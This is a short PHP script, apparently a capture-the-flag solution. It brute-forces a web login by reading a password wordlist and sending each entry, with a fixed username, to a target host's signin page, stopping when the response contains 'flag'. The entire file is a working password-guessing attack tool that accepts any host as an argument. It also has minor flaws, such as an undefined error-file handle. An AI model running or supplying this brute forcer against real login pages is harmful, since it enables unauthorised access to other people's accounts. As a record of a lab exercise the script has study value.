<?php

function grep($linet, $str) {
  $line = explode(PHP_EOL,$linet);
 for ($s = 0;  count($line) > $s; $s++) {
     if (strpos($line[$s], $str) !== false) {
            return $line[$s];
        }
    }
    return -1;
}

$a = $homepage = file_get_contents($argv[2]);
$e =  explode("\n",$a);
foreach ($e as &$b) {
	$url = "http://$argv[1]/?page=signin&username=dsds&password=$b&Login=Login#";
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$z = curl_exec($ch);
	$ee = $currentprofile=grep($z, "flag");
	if ($ee != -1) {
		echo $ee;
		echo $b;
		return;
	}
	if(curl_error($ch)) {
	    fwrite($fp, curl_error($ch));
	}
	curl_close($ch);

}
